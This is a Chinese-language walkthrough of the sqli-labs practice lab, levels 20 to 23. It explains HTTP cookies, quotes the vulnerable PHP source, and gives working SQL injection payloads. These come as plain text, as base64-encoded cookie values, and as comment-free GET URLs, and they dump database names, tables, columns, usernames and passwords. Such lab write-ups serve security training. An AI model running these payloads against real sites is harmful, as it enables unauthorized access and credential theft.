<p>当时网景通讯的一名员工 Lou Montulli，在 1994 年将 “magic cookies” 的概念应用到 Web 通讯中。他试图解决 Web 的第一个购物车应用，现在购物车成了购物网站的支柱。他的原始说明文档提供了 cookie 工作原理的基本信息，该文档后来被作为规范纳入到 RFC 2109（大多数浏览器的实现参考文档）中，最终被纳入到 RFC 2965 中。Montulli 也被授予 cookie 的美国专利。网景浏览器在它的第一个版本中就开始支持 cookie，现在所有 Web 浏览器都支持 cookie。</p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>简单地说，cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie 是纯文本格式，不包含任何可执行的代码。一个 Web 页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web 服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个 cookie，只要这个 cookie 存在并有效，用户就可以自由浏览这个网站的任意页面。再次说明，cookie 只包含数据，就其本身而言并不有害。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>Cookie 总是保存在客户端中，按在客户端中的存储位置，可分为内存 Cookie 和硬盘 Cookie。</p>
<p>内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘 Cookie 保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘 Cookie 不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久 Cookie 和持久 Cookie。</p>
<h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</p>
<p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p>
<p>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p>
<h4 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h4><ol>
<li>Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。</li>
<li>由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题，除非用HTTPS。</li>
<li>Cookie的大小限制在4KB左右，对于复杂的存储需求来说是不够用的。</li>
</ol>
<h3 id="注入步骤-9"><a href="#注入步骤-9" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/22/QcOkfpNzvxTlXY4.png" alt="less20-1.png"></p>
<p><img src="https://i.loli.net/2019/11/22/Knt5jYJu3x2PwMp.png" alt="less20-2.png"></p>
<ol start="2">
<li><strong>首先判断有无cookie，没有的话，查询出来再设置cookie</strong></li>
</ol>
<pre class="line-numbers language-php"><code class="language-php">                <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>




                <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>
                <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span>
                                <span class="token punctuation">{</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
                                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"I LOVE YOU COOKIES"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 >'</span><span class="token punctuation">;</span>
                                <span class="token comment" spellcheck="true">//echo 'Your Cookie is: ' .$cookee;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg" />'</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li><strong>若 cookie 存在，又分两种情况， 第一种情况，你登陆过，cookie 还有效，你没按删除 cookie 的按钮，那么他就输出各种信息，包括删除 cookie 的按钮</strong></li>
</ol>
<pre class="line-numbers language-php"><code class="language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>

                        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token variable">$format</span> <span class="token operator">=</span> <span class="token string">'D d M Y - H:i:s'</span><span class="token punctuation">;</span>
                        <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;br>&lt;br>'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/Less-20.jpg" />'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>&lt;b>"</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;font color= "red" font size="4">'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"YOUR USER AGENT IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;br>"</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "cyan" font size="4">'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"YOUR IP ADDRESS IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;br>"</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 4 >'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br>"</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "orange" font size = 5 >'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">"YOUR COOKIE : uname = $cookee and expires: "</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$format</span><span class="token punctuation">,</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>
                        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span><span class="token punctuation">;</span>
                        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>
                                <span class="token punctuation">{</span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Issue with your mysql: '</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
                        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
                                <span class="token punctuation">{</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "pink" font size="5">'</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'Your Login name:'</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "grey" font size="5">'</span><span class="token punctuation">;</span>  
                                <span class="token keyword">echo</span> <span class="token string">'Your Password:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;/b>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'Your ID:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>
                        <span class="token keyword">else</span>
                                <span class="token punctuation">{</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;br>&lt;br>'</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap1.jpg" />'</span><span class="token punctuation">;</span>
                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>&lt;b>"</span><span class="token punctuation">;</span>
                                <span class="token comment" spellcheck="true">//echo '&lt;img src="../images/Less-20.jpg" />';</span>
                                <span class="token punctuation">}</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;center>'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;form action="" method="post">'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" />'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;/form>'</span><span class="token punctuation">;</span>
                        <span class="token keyword">echo</span> <span class="token string">'&lt;/center>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="4">
<li><strong>第二种情况，你按了删除cookie的按钮,后台就把cookie的时间设置为过期的时间，那么cookie就被删除了</strong></li>
</ol>
<pre class="line-numbers language-php"><code class="language-php">        <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">'&lt;center>'</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 6 >'</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">" Your Cookie is deleted"</span><span class="token punctuation">;</span>
                                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">'&lt;/font>&lt;/center>&lt;/br>'</span><span class="token punctuation">;</span>

                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="5">
<li><strong>暴数据库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">admin' union select 1,user(),database()#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/22/BTmf82MoitJ1OZl.png" alt="less20-3.png"></p>
<p><img src="https://i.loli.net/2019/11/22/1qwl7Wp5CFy8EPQ.png" alt="less20-4.png"></p>
<ol start="6">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/22/HcjaT5Mdi21DxFb.png" alt="less20-5.png"></p>
<ol start="7">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/22/c2UlL6jOzFTQSg9.png" alt="less20-6.png"></p>
<ol start="8">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/22/j9gIqV3KsxT8p6Q.png" alt="less20-7.png"></p>
<h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>这一关是 HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p>
<hr>
<ol>
<li><strong>正确登录到界面后，发现 cookie 值有些不同</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/26/iOVvyM326TElYgn.png" alt="less21-1.png"></p>
<ol start="2">
<li><strong>从输出的字符来看，cookie 是被加密了。</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">YWRtaW4=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li><strong>看到加密字符串最后有一个 <code>=</code> ,首先想到的是 base64，尝试解密。</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/26/aQ5Dx7kXYKAdUT3.png" alt="less21-2.png"></p>
<p><img src="https://i.loli.net/2019/11/26/FcBO3Res1LozYhD.png" alt="less21-3.png"></p>
<ol start="4">
<li><strong>使用 base64 将 payload 加密</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：admin' union select 1,user(),database()#
base64：YWRtaW4nIHVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol start="5">
<li><strong>尝试使用 modify headers 修改 cookie 并刷新界面。发现无法成功，界面转到了登录界面</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/26/UzXhyqkBs48npr9.png" alt="less21-4.png"></p>
<p><img src="https://i.loli.net/2019/11/26/z6hV2WyMCUbiIGo.png" alt="less21-5.png"></p>
<ol start="6">
<li><strong>使用 burpsuit 抓包，改 cookie 值,并重新转发</strong></li>
</ol>
<p><img src="https://i.loli.net/2019/11/26/2ghM7kBrFaKf1cn.png" alt="less21-6.png"></p>
<p><img src="https://i.loli.net/2019/11/26/LvW18ztCnIRUDp9.png" alt="less21-7.png"></p>
<ol start="7">
<li><strong>从上面发现 sql 语句报错有 ” ‘) “，重新修改 payload。</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin') union select 1,user(),database()#
base64：LWFkbWluJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/5apk9Igq2uPLErJ.png" alt="less21-8.png"></p>
<p>注：union 前面的值要为空，第四步忘记改为空值了</p>
<ol start="8">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#
base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyBXSEVSRSBUQUJMRV9TQ0hFTUE9J3NlY3VyaXR5JyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/9w2Y6elNZqD3aWA.png" alt="less21-9.png"></p>
<ol start="9">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#
base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5DT0xVTU5TIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIEFORCBUQUJMRV9OQU1FPSd1c2Vycycj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/b7XWhAfto35BU8m.png" alt="less21-10.png"></p>
<ol start="10">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#
base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh1c2VybmFtZSksZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBGUk9NIHNlY3VyaXR5LnVzZXJzIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/sZ52OUvYQ81Wrtj.png" alt="less21-11.png"></p>
<h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>这一关是 HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p>
<hr>
<ol>
<li><strong>暴库</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin" union select 1,user(),database()#
base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoKSM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/LHFi5MjPUdWJeSl.png" alt="less22-1.png"></p>
<ol start="2">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#
base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuVEFCTEVTIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/gQen9pUJYGC3jMm.png" alt="less22-2.png"></p>
<ol start="3">
<li><strong>暴字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#
base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLkNPTFVNTlMgV0hFUkUgVEFCTEVfU0NIRU1BPSdzZWN1cml0eScgQU5EIFRBQkxFX05BTUU9J3VzZXJzJyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/RjsG6YMoTxJntWm.png" alt="less22-3.png"></p>
<ol start="4">
<li><strong>暴数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#
base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIEZST00gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/11/26/UhRg2alQ7oLrTGA.png" alt="less22-4.png"></p>
<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>GET型基于错误的去除注释的注入</p>
<ol>
<li><p><strong>查看源码</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//filter the comments out so as to comments should not work</span>
<span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">"/#/"</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//匹配 “#” 字符</span>
<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string">"/--/"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//匹配 “--” 字符</span>
<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//空值</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “#” 字符，替换为空值</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “--” 字符，替换为空值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><strong>添加 “单引号” 报错</strong></p>
</li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/ouAJi4TaHQ3N8gE.png" alt="less23-1.png"></p>
<ol start="3">
<li><strong>既然这里无法注释，那就把 “单引号” 闭合掉</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1' or '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/ut6z3PmaeGFkyEw.png" alt="less23-2.png"></p>
<ol start="4">
<li><strong>获取数据库登录用户、数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1'union select 1,user(),database()'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/BYROsNzVa6kGZ8i.png" alt="less23-3.png"></p>
<ol start="5">
<li><strong>暴表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/l7LUR3NiKcrwdmW.png" alt="less23-4.png"></p>
<ol start="6">
<li><strong>爆表中的字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/CFwnLI58kDKuWP7.png" alt="less23-5.png"></p>
<ol start="7">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(username) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/10/CRlUzM4c5QLKsrH.png" alt="less23-6.png"></p>
